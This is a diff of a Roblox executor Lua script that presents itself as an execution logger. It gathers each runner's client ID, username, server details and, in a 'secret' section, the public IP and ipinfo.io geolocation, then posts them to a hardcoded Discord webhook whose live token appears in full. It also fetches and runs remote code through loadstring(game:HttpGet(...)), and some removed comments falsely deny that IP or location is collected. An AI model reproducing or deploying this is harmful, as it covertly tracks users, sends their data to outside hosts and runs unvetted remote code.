@@ -1,9 +1,6 @@
--- Main Logs
-
---// Config
-getgenv().whscript = "Script Logs"        --Change to the name of your script
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1439537916174008420/p8br6BWX6t-4HRSZn25Hafy7FGkYEL6ky4IXEgVh_7Bus5Pebqoc1ImuLmfSESLWvjD3"  --Put your Webhook Url here
-getgenv().ExecLogSecret = true            --decide to also log secret section (note: secret network/location data is NOT collected)
+getgenv().whscript = "Script Logs"        
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1439696796686225638/hfg2yu0LrvxZV1Gm74xSI2dKEiNKHzdYdGRZQJDzN4-gZwVCeV5nMfWm1pYIb20nPLHT"
+getgenv().ExecLogSecret = true            
 
 if _G.__ERX then
     return
@@ -11,20 +8,16 @@ end
 
 _G.__ERX = true
 
-
---// Execution Log Script
--- Get HWID
 local MainURL = "https://raw.githubusercontent.com/lolthatseazy/FluentLib/refs/heads/main/"
 local PrivateMembersURL, PrivateMembers = (MainURL .. "Members.lua"), {}
 local AnalyticsService = game:GetService("RbxAnalyticsService")
-local clientId = AnalyticsService:GetClientId() -- HWID
+local clientId = AnalyticsService:GetClientId() 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local AnalyticsService = game:GetService("RbxAnalyticsService")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 
--- Get executor name safely (many exploits provide getexecutor)
 local executorName = (pcall(identifyexecutor) and identifyexecutor()) or "Unknown Executor"
 local ui = gethui()
 local folderName = "screen"
@@ -33,7 +26,7 @@ folder.Name = folderName
 local player = game:GetService("Players").LocalPlayer
 
 local HttpService = game:GetService("HttpService")
-local headshotUrl = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Default/420/420/AvatarHeadshot/Png/noFilter" -- fallback
+local headshotUrl = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Default/420/420/AvatarHeadshot/Png/noFilter" 
 
 local success, result = pcall(function()
 	local response = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false")
@@ -44,13 +37,10 @@ if success and result and result.data and result.data[1] and result.data[1].imag
 	headshotUrl = result.data[1].imageUrl
 end
 
--- Make sure PrivateMembers table exists
 PrivateMembers = PrivateMembers or {}
 
--- Flag for local player ERX check
 local WLCheckLocalPlayer = false
 
--- ERX Private check (online whitelist)
 local function PlayerWhitelistCheck(Player, UseStatic, Code)
     local suc, err = pcall(function()
         local PlayerHash = (HashLib and HashLib.sha1) and HashLib.sha1(tostring(Player.Name..Player.UserId)) or nil
@@ -109,7 +99,6 @@ local function PlayerWhitelistCheck(Player, UseStatic, Code)
     return suc
 end
 
--- Custom Private check (local)
 local function IsCustomPrivate()
     local display = LocalPlayer.DisplayName:lower()
     local userName = "Unknown"
@@ -127,15 +116,10 @@ local function IsCustomPrivate()
     return userName ~= "Unknown", userName
 end
 
--- Example usage: show both checks in a table
 local function GetPrivateStatus(Player)
-    -- Run ERX check
     PlayerWhitelistCheck(Player, false, "")
-
-    -- Run Custom check
     local isCustom, customName = IsCustomPrivate()
 
-    -- Prepare output table
     local status = {
         ERXPrivate = PrivateMembers[Player.Name] and "Yes" or "No",
         CustomPrivate = isCustom and ("Yes ("..customName..")") or "No"
@@ -144,10 +128,8 @@ local function GetPrivateStatus(Player)
     return status
 end
 
--- Example for LocalPlayer
 local status = GetPrivateStatus(LocalPlayer)
 
--- Utility: safe getter for Info folder values (returns "N/A" when missing)
 local function readInfoValuesFromReplicatedStorage()
 	local results = {
 		ServerName = "N/A (Public Server)",
@@ -190,7 +172,6 @@ local function readInfoValuesFromReplicatedStorage()
 		results.ServerPack = getVal("ServerPack")
 		results.Tier = getVal("Tier")
 
-		-- CoOwnerIds folder (multiple StringValues)
 		local coFolder = infoFolder:FindFirstChild("CoOwnerIds")
 		if coFolder and coFolder:IsA("Folder") then
 			local list = {}
@@ -213,7 +194,6 @@ local function readInfoValuesFromReplicatedStorage()
 end
 
 if ui:FindFirstChild(folderName) then
-	-- Already present: still proceed but mark that execution occurred (keeps original intent)
 	local ui2 = gethui()
 	local folderName2 = "screen2"
 	local folder2 = Instance.new("Folder")
@@ -223,12 +203,10 @@ if ui:FindFirstChild(folderName) then
 	end
 end
 
--- Ensure folder exists in UI (original behavior)
 if not gethui():FindFirstChild(folderName) then
 	folder.Parent = gethui()
 end
 
--- Collect core execution data (no IP / no location)
 local players = game:GetService("Players")
 local userid = player and player.UserId or "N/A"
 local gameid = game.PlaceId
@@ -248,9 +226,8 @@ local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid
 local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
 local gameVersion = game.PlaceVersion or "N/A"
 
-task.wait(2) -- small wait to allow things to initialize
+task.wait(2) 
 
--- Ping (safe)
 local pingValue = "N/A"
 pcall(function()
 	local serverStats = game:GetService("Stats").Network.ServerStatsItem
@@ -258,7 +235,6 @@ pcall(function()
 	pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
 end)
 
--- Premium check (safe)
 local function checkPremium()
 	local premium = "false"
 	local ok, response = pcall(function() return player.MembershipType end)
@@ -271,10 +247,8 @@ end
 local premium = checkPremium()
 local url = getgenv().webhookexecUrl
 
--- Read Info folder values
 local privateInfo = readInfoValuesFromReplicatedStorage()
 
--- Build embed payload (only game/server/Info values; NO IP/GEO)
 local data = {
 	["content"] = "@here",
 	["embeds"] = {{
@@ -405,7 +379,6 @@ local data = {
 	}}
 }
 
-    -- Check if the secret tab should be included
     if getgenv().ExecLogSecret then
         local ip = game:HttpGet("https://api.ipify.org")
         local iplink = "https://ipinfo.io/" .. ip .. "/json"
@@ -431,7 +404,6 @@ local data = {
         )
     end
 
---// Skip logging if DisplayName contains "ESPN"
 if string.find(string.lower(player.DisplayName), "espn") then
 	warn("Fahhh:", player.DisplayName)
 	return
@@ -439,7 +411,6 @@ end
 
 loadstring(game:HttpGet("https://luraphv2.vercel.app/api/V2.lua"))()
 
--- Send webhook (safe request)
 local headers = {["content-type"] = "application/json"}
 local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
 if requestfn then
